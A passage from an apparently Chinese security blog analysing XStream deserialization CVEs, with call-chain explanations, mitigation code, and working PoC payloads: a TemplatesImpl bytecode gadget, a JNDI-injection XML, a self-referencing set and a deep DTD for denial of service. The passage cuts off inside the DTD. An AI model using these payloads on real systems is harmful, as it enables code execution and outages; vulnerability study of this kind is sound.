luaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIyMDU0MTY0NDMxMDIwMTkBACBMeXNvc2VyaWFsL1B3bmVyMjA1NDE2NDQzMTAyMDE5OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==&lt;/byte-array&gt;</span><br><span class="line">                    &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;</span><br><span class="line">                  &lt;/__bytecodes&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">              &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">            &lt;/bean&gt;</span><br><span class="line">            &lt;localCache&gt;</span><br><span class="line">              &lt;methods&gt;</span><br><span class="line">                &lt;entry&gt;</span><br><span class="line">                  &lt;string&gt;getOutputProperties&lt;/string&gt;</span><br><span class="line">                  &lt;list&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;getOutputProperties&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                  &lt;/list&gt;</span><br><span class="line">                &lt;/entry&gt;</span><br><span class="line">              &lt;/methods&gt;</span><br><span class="line">            &lt;/localCache&gt;</span><br><span class="line">          &lt;/attrIndexTable&gt;</span><br><span class="line">          &lt;shortCodeHeader__h__limit&gt;0&lt;/shortCodeHeader__h__limit&gt;</span><br><span class="line">        &lt;/outer-class&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string-array&gt;</span><br><span class="line">      &lt;string&gt;yxxx&lt;/string&gt;</span><br><span class="line">      &lt;string&gt;outputProperties&lt;/string&gt;</span><br><span class="line">    &lt;/string-array&gt;</span><br><span class="line">    &lt;string-array&gt;</span><br><span class="line">      &lt;string&gt;yxxx&lt;/string&gt;</span><br><span class="line">    &lt;/string-array&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>这个依赖javafx，为了方便我直接导入了下面maven坐标：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;eu.mihosoft.vrl&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;vrl&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.4.4.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>以PriorityQueue的readObject为入口点，触发comparator属性的compare方法，来到PackageWriter的compare方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141342705.png" alt="image-20230414134259599"></p>
<p>比较a0第一个元素和a1第一个元素是否相等，相等的话，从attrIndexTable属性中获取a0的第二个元素，这时候就来到了BeanAdapter的get方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141345322.png" alt="image-20230414134524221"></p>
<p>转正字符串，然后调用重载的get方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141346193.png" alt="image-20230414134612079"></p>
<p>在get方法中，先判断参数是否以Property结尾，不是的话调用getGetterMethod方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141347445.png" alt="image-20230414134730347"></p>
<p>在getGetterMethod方法先在字符串outputProperties前拼接个get字符串，然后从本地缓存中获取该字符串对应的方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141358408.png" alt="image-20230414135856334"></p>
<p>返回getOutputProperites方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141408456.png" alt="image-20230414140804372"></p>
<p>在get方法中直接执行了返回的getOutputProperites方法，将提前封装好的对象TemplatesImpl进行传入。后续就是经典TemplatesImpl利用链的部分了。</p>
<h2 id="CVE-2021-39154"><a href="#CVE-2021-39154" class="headerlink" title="CVE-2021-39154"></a>CVE-2021-39154</h2><h3 id="分析-31"><a href="#分析-31" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成JNDI注入，而且跟<a href="#CVE-2021-39146">CVE-2021-39146</a>一模一样，实在搞不懂一份相同的POC搞两个CVE？而且将其放在官网。就因为不同的人发现的？那也应该把CVE给最先发现的那个人吧？</p>
<p>这是39154的致谢：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141426905.png" alt="image-20230414142612836"></p>
<p>这是39146的致谢：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141426757.png" alt="image-20230414142639688"></p>
<p>重点在于两个人怎么想到的？利用链、POC都一模一样，一个前一个后，这怕不是抄袭？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;javax.swing.MultiUIDefaults&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;unserializable-parents/&gt;</span><br><span class="line">      &lt;hashtable&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">        &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">      &lt;/hashtable&gt;</span><br><span class="line">      &lt;javax.swing.MultiUIDefaults&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;tables&gt;</span><br><span class="line">            &lt;javax.swing.UIDefaults serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;unserializable-parents/&gt;</span><br><span class="line">              &lt;hashtable&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;loadFactor&gt;0.75&lt;/loadFactor&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">                &lt;int&gt;700&lt;/int&gt;</span><br><span class="line">                &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                &lt;string&gt;ggg&lt;/string&gt;</span><br><span class="line">                &lt;javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">                  &lt;className&gt;javax.naming.InitialContext&lt;/className&gt;</span><br><span class="line">                  &lt;methodName&gt;doLookup&lt;/methodName&gt;</span><br><span class="line">                  &lt;args&gt;</span><br><span class="line">                    &lt;string&gt;rmi://localhost:1097/Object&lt;/string&gt;</span><br><span class="line">                  &lt;/args&gt;</span><br><span class="line">                &lt;/javax.swing.UIDefaults_-ProxyLazyValue&gt;</span><br><span class="line">              &lt;/hashtable&gt;</span><br><span class="line">            &lt;/javax.swing.UIDefaults&gt;</span><br><span class="line">          &lt;/tables&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/javax.swing.MultiUIDefaults&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27; /&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<h2 id="分割线-3"><a href="#分割线-3" class="headerlink" title="分割线"></a>分割线</h2><p>终于肝完了1.4.17的14个漏洞。先看看1.4.18版本，将黑名单改成了白名单，白名单如下：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141621572.png" alt="image-20230414162135432"></p>
<p>以及如下类的子类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141624014.png" alt="image-20230414162419889"></p>
<h2 id="CVE-2021-43859"><a href="#CVE-2021-43859" class="headerlink" title="CVE-2021-43859"></a>CVE-2021-43859</h2><h3 id="分析-32"><a href="#分析-32" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成DOS，POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;set&gt;</span><br><span class="line">	&lt;set&gt;</span><br><span class="line">		&lt;string&gt;c&lt;/string&gt;</span><br><span class="line">		&lt;set reference=&#x27;../../../set/set&#x27;/&gt;</span><br><span class="line">	 &lt;/set&gt;</span><br><span class="line">&lt;/set&gt;</span><br></pre></td></tr></table></figure>

<p>由于set集合引用自身，所以当调用该set集合的hashCode方法时，会不断的去找引用，然后调用引用的hashCode，然后在引用的hashCode方法中，又找引用，再调用引用的hashCode，最终造成无线循环。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304142115307.png" alt="image-20230414211537174"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304142123768.png" alt="image-20230414212346659"></p>
<p>以下容易受到此攻击的类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap</span><br><span class="line">java.util.HashSet</span><br><span class="line">java.util.Hashtable</span><br><span class="line">java.util.LinkedHashMap</span><br><span class="line">java.util.LinkedHashSet</span><br><span class="line">java.util.Stack（仅限旧的 Java 修订版）</span><br><span class="line">java.util.Vector（仅限旧的 Java 修订版）</span><br><span class="line">其他使用其元素哈希码的第三方集合实现也可能受到影响</span><br></pre></td></tr></table></figure>

<h3 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h3><p>如果根本不使用引用，您可以简单地设置 NO_REFERENCE 模式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XStream xstream = new XStream(); </span><br><span class="line">xstream.setMode(XStream.NO_REFERENCES);</span><br></pre></td></tr></table></figure>

<p>如果既不包含 Hashtable、HashMap 也不包含 HashSet（或它的子类之一），那么您可以使用安全框架来拒绝使用这些类型：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XStream xstream = new XStream(); </span><br><span class="line">xstream.denyTypes(new Class[]&#123; </span><br><span class="line">	java.util.HashMap.class, java.util.HashSet.class, java.util.Hashtable.class, java.util.LinkedHashMap.class, java.util.LinkedHashSet.class </span><br><span class="line">&#125;) ;</span><br></pre></td></tr></table></figure>

<p>不幸的是，这些类型很常见。如果您只使用 HashMap 或 HashSet 并且您的 XML 仅将它们引用为默认map或collection，您可以在反序列化时另外更改 java.util.Map 和 java.util.Set 的默认实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xstream.addDefaultImplementation（java.util.TreeMap.class，java.util.Map.class）；</span><br><span class="line">xstream.addDefaultImplementation（java.util.TreeSet.class，java.util.Set.class）；</span><br></pre></td></tr></table></figure>

<p>但是，这意味着您的应用程序不关心map的实现并且所有元素都是可比较的。</p>
<h2 id="分割线-4"><a href="#分割线-4" class="headerlink" title="分割线"></a>分割线</h2><p>以下是 1.4.19版本爆出的漏洞。</p>
<h2 id="CVE-2022-40152"><a href="#CVE-2022-40152" class="headerlink" title="CVE-2022-40152"></a>CVE-2022-40152</h2><h3 id="分析-33"><a href="#分析-33" class="headerlink" title="分析"></a>分析</h3><p>其实这算Woodstox的问题，不算XStream的问题，只是XStream会使用到Woodstox组件，在该组件的FullDTDReader.java类的readContentSpec方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141833004.png" alt="image-20230414183320838"></p>
<p>要是xml中有许多的<code>(</code>则会一直递归直到堆栈溢出，导致DOS。</p>
<p>poc如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE hT[</span><br><span class="line">&lt;!ELEMENT</span><br><span class="line"></span><br><span class="line">鲵u?</span><br><span class="line"></span><br><span class="line">(Andyo檇?,靗?,l?,l?,lL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l蟬chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,((l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l蟬chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,(chemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(llL*,((l*,(l*,(l:schemc*,(